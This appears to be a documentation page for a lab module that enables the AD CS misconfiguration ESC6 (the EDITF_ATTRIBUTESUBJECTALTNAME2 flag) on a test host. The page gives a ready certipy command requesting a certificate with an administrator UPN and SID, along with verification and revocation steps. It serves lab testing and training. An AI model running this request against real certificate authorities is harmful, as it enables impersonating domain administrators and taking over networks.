# esc6

CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 (enrollee-supplied SAN on any template, ESC6). Sets `adcs.editf_san` to `on` on a host providing `adcs`.

Attack:

Request a User certificate with a SAN for a privileged account:

    certipy req -u <user> -p 'Aa1234567890!' -ca <NB>-CA -template User -upn administrator@<domain> -sid <administrator SID>

Certificates issued with a SAN while the flag was on stay valid after disable: they cannot be told apart from normal issuance. Revoke them by hand with `certutil -revoke <serial>`.

How to verify:

    certutil -getreg policy\EditFlags   # lists EDITF_ATTRIBUTESUBJECTALTNAME2 when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
